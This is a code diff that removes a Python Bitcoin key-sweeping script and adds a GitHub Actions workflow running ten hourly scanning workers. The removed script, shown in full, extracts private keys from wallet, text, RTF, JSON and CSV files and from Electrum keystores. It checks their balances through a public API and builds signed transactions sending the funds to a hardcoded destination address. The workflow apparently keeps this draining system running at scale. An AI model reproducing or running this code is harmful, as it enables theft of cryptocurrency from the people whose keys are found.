@@ -1,91 +1,47 @@
-import json, re, os, requests, time
-from bitcoinlib.keys import Key
-from bitcoinlib.transactions import Transaction
+name: FDR Unified System - 10 Workers
 
-# --- CONFIGURAÇÕES ---
-DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"
-WORKER_ID = int(os.environ.get('WORKER_ID', 1))
-TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 10))
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 * * * *'
 
-def create_raw_tx(wif, balance_sats):
-    try:
-        k = Key(wif, network='bitcoin')
-        fee = 3000 # Taxa para garantir prioridade máxima
-        amount = balance_sats - fee
-        if amount <= 546: return None
-        t = Transaction(network='bitcoin')
-        t.add_input(k.address(), balance_sats)
-        t.add_output(DEST_ADDRESS, amount)
-        t.sign(k)
-        return t.raw_hex()
-    except: return None
-
-def check_balance_and_broadcast(priv_key_str, original_addr=None):
-    try:
-        k = Key(priv_key_str, network='bitcoin')
-        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
-            addr = k.address(witness_type=witness_type)
-            target = original_addr if (original_addr and witness_type is None) else addr
-            time.sleep(0.15) 
-            try:
-                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
-                stats = r.get('chain_stats', {})
-                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
-                if bal > 0:
-                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
-                    raw_hex = create_raw_tx(k.wif(), bal)
-                    if raw_hex: print(f"HEX_GEN:{raw_hex}")
-                    return True
-            except: continue
-    except: pass
-    return False
-
-def process_file(file_path):
-    try:
-        with open(file_path, 'r', errors='ignore') as f:
-            content = f.read()
-            # Limpeza para RTF (remove tags de formatação)
-            if file_path.lower().endswith('.rtf'):
-                content = re.sub(r'\\[a-z0-9]+', '', content)
-
-            # 1. Scanner JSON (Electrum/Wallets)
-            if '"keystore"' in content or '"keypairs"' in content:
-                try:
-                    data = json.loads(content)
-                    if 'keypairs' in data:
-                        for addr, priv in data['keypairs'].items():
-                            check_balance_and_broadcast(priv, addr)
-                    if 'keystore' in data and 'xprv' in data['keystore']:
-                        master = Key(data['keystore']['xprv'])
-                        for i in range(200):
-                            check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
-                except: pass
-            
-            # 2. Scanner Universal (WIFs e HEX) - Pega em TXT, CSV, RTF
-            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
-            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
-            
-            combined = list(set(wifs + hex_keys))
-            if combined:
-                print(f"   ∟ Extraídas {len(combined)} chaves de {os.path.basename(file_path)}")
-                for key in combined:
-                    check_balance_and_broadcast(key)
-    except Exception as e:
-        print(f"⚠️ Erro ao ler {file_path}: {e}")
-
-if __name__ == "__main__":
-    exts = ('.wallet', '.txt', '.key', '.rtf', '.json', '.csv')
-    all_files = []
-    for root, dirs, files in os.walk('.'):
-        for f in files:
-            if f.lower().endswith(exts): 
-                if not root.startswith('./.'): # Ignora pastas ocultas do sistema
-                    all_files.append(os.path.join(root, f))
+jobs:
+  fdr_scan:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+      max-parallel: 10
     
-    all_files = sorted(list(set(all_files)))
-    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
-    
-    print(f"🚀 WORKER {WORKER_ID} | TOTAL REPO: {len(all_files)} | MEUS: {len(my_files)}")
-    for f in my_files:
-        print(f"🔍 Scan: {f}")
-        process_file(f)
+    steps:
+      - name: Checkout do código
+        uses: actions/checkout@v4
+      
+      - name: Configurar Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+      
+      - name: Instalar Dependências
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y libgmp3-dev
+          python -m pip install --upgrade pip
+          pip install requests bitcoinlib
+      
+      - name: 📋 INVENTÁRIO DE ARQUIVOS (Diagnóstico)
+        run: |
+          echo "=== LISTA COMPLETA DE ARQUIVOS NO REPOSITÓRIO ==="
+          find . -maxdepth 3 -not -path '*/.*'
+          echo "================================================"
+
+      - name: Dar Permissão ao Runner
+        run: chmod +x run_worker.sh
+
+      - name: Executar Sistema Unificado
+        env:
+          WORKER_ID: ${{ matrix.worker }}
+          TOTAL_WORKERS: 10
+        run: |
+          echo "🚀 Iniciando Worker $WORKER_ID de 10..."
+          ./run_worker.sh
